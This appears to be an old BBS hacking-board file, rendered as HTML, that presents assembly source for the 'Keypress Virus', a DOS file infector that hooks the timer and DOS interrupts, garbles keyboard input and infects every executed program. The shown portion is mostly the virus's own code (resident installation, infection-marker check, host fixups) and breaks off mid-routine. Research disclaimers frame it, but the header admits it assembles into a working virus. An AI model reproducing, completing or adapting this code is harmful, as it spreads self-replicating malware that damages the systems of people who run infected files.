-=] For All Your H/P/A/V Files [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp; SysOp: Peter Venkman&nbsp;&nbsp;&nbsp; [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +31.(o)79.426o79&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
[=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=]&nbsp; P E R F E C T&nbsp; C R I M E&nbsp; [=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=][][][][][][][][][][][][][][][=-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*** NOT FOR GENERAL DISTRIBUTION ***&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">; This File is for the Purpose of Virus Study
Only! It Should not be Passed&nbsp; ;</font>
<br><font color="#3333FF">; Around Among the General Public. It Will be
Very Useful for Learning how&nbsp;&nbsp; ;</font>
<br><font color="#3333FF">; Viruses Work and Propagate. But Anybody With
Access to an Assembler can&nbsp;&nbsp;&nbsp; ;</font>
<br><font color="#3333FF">; Turn it Into a Working Virus and Anybody With
a bit of Assembly Coding&nbsp;&nbsp;&nbsp;&nbsp; ;</font>
<br><font color="#3333FF">; Experience can Turn it Into a far More Malevolent
Program Than it Already&nbsp; ;</font>
<br><font color="#3333FF">; Is. Keep This Code in Responsible Hands!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#3333FF">;****************************************************************************;</font>
<br><font color="#3333FF">;********************************************************</font>
<br><font color="#3333FF">; Source code of the Keypress Virus - Made by
XSTC</font>
<br><font color="#3333FF">; Made in A86 v3.07</font>
<br><font color="#3333FF">;</font>
<br><font color="#3333FF">; The Keypress Virus installs itself in top of
DOS</font>
<br><font color="#3333FF">; memory, without using DOS resident functions.
It will</font>
<br><font color="#3333FF">; hook int 1Ch (timer) and 21h (DOS) and will
copy every</font>
<br><font color="#3333FF">; 10 minutes during 2 seconds the keys you press
five</font>
<br><font color="#3333FF">; times (so if you press '1' it will be '111111')
- if</font>
<br><font color="#3333FF">; you press no key, it will usually give ESCs.</font>
<br><font color="#3333FF">;</font>
<br><font color="#3333FF">; In DOS 3+ it spreads to every file executed
- so it</font>
<br><font color="#3333FF">; can, besides COM/EXE, infect DRV/OVL/etc.</font>
<br><font color="#3333FF">; It also spreads itself in DOS 1 and 2 with
a special</font>
<br><font color="#3333FF">; routine - in this case only COM/EXE files will
be</font>
<br><font color="#3333FF">; infected.</font>
<br><font color="#3333FF">;</font>
<br><font color="#3333FF">; It adds, after making full paragraphs of the
file</font>
<br><font color="#3333FF">; length, 1232 bytes to COM-files and 1216 to
EXE.</font>
<br><font color="#3333FF">;</font>
<br><font color="#3333FF">; This code is only made to show the possibilities
and</font>
<br><font color="#3333FF">; dangers of a virus. It is only intended for
research</font>
<br><font color="#3333FF">; purposes - spreading a virus is prohibited
by law.</font>
<br><font color="#3333FF">;</font>
<br><font color="#3333FF">; NOTE - The compiled code is not 100% compatible
with</font>
<br><font color="#3333FF">; the Keypress virus. A86 compiles the 'ADD BX,AX'
and</font>
<br><font color="#3333FF">; 'MOV DI,SI' different. This has totally no
effect</font>
<br><font color="#3333FF">; on the program.</font>
<br><font color="#3333FF">;********************************************************</font>
<p><font color="#3333FF">; After compiling the new virus, enter the new
size in paragraphs in VirParSize</font>
<br><font color="#3333FF">; and compile again.</font>
<p><font color="#3333FF">VirParSize&nbsp;&nbsp;&nbsp; equ 4Ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Size of the original KeyPress virus</font>
<p><font color="#3333FF">VirStart:&nbsp;&nbsp;&nbsp;&nbsp; jmp long VirBegin</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db 0</font>
<p><font color="#3333FF">ComStart:&nbsp;&nbsp;&nbsp;&nbsp; mov bx,cs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; When the virus has infected a .COM file,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add bx,[102h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; this is the jump to the virus. Actually,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; this code is overwritten with the code</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,offset VirBegin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; in the end of the virus.</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
retf</font>
<p><font color="#3333FF">EB02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw 02EBh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 'jmp 104' - first 2 bytes in .COM file</font>
<p><font color="#3333FF">VirSize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
VirParSize shl 4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Size of virus in whole pars</font>
<p><font color="#3333FF">VirPars&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dw
VirParSize + 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Size of virus in pars+1</font>
<p><font color="#3333FF">MaxComSize&nbsp;&nbsp;&nbsp; dw 0FF00h-VirParSize&nbsp;
; Max. size .COM file to infect (100h stack)</font>
<p><font color="#3333FF">Com_or_exe&nbsp;&nbsp;&nbsp; db 00h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; 0 = Com-File, 1 = Exe-File</font>
<br><font color="#3333FF">R_Ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Di&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Si&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Bp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Es&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_Ds&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_SS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">R_SP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<p><font color="#3333FF">Exe_CS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">Exe_IP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br>&nbsp;
<p><font color="#3333FF">VirBegin:&nbsp;&nbsp;&nbsp;&nbsp; call Save_Regs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Start of virus</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Fix_cs_ss&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Fix CS and SS of orig. prog
(for .EXE files)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Get_cs_ip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Get CS and IP of original prog</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Check_res&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Check virus already resident</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb Exit_inst&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes, quit</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Inst_mem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Install in memory</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jb Exit_inst&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Error, quit</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call Inst_ints&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Hook interrupts</font>
<br><font color="#3333FF">Exit_Inst:&nbsp;&nbsp;&nbsp; jmp short Rst_regs_prg</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
nop</font>
<p><font color="#3333FF">Jmp_Prg:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 0EAh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Jump to original program</font>
<br><font color="#3333FF">PrgOfs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<br><font color="#3333FF">PrgSeg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dw (?)</font>
<p><font color="#3333FF">Check_res:&nbsp;&nbsp;&nbsp; push ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor bx,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ds,bx</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,600h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Unused word in memory</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp word ptr [bx],1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Already installed?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz Installed&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Yes</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov word ptr [bx],1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; No</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
stc</font>
<p><font color="#3333FF">Installed:&nbsp;&nbsp;&nbsp; cmc</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** For .EXE: Fix orig-prog CS and SS ***</font>
<p><font color="#3333FF">Fix_cs_ss:&nbsp;&nbsp;&nbsp; test byte ptr [Com_or_exe],1</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jz no_exe</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add ax,10h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add Exe_cs,ax</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add R_ss,ax</font>
<p><font color="#3333FF">No_Exe:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret</font>
<br>&nbsp;
<p><font color="#3333FF">;*** Get CS + IP of orig. program, and for .COM:
Restore first 16 bytes ***</font>
<p><font color="#3333FF">Get_cs_ip:&nbsp;&nbsp;&nbsp; mov ax,[Exe_cs]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,[Exe_ip]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
test byte ptr [Com_or_exe],1</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz No_rest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; .EXE file: no restore of first bytes</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ax,es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov bx,100h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov cx,10h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov si,offset First_bytes</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov di,100h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cld</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
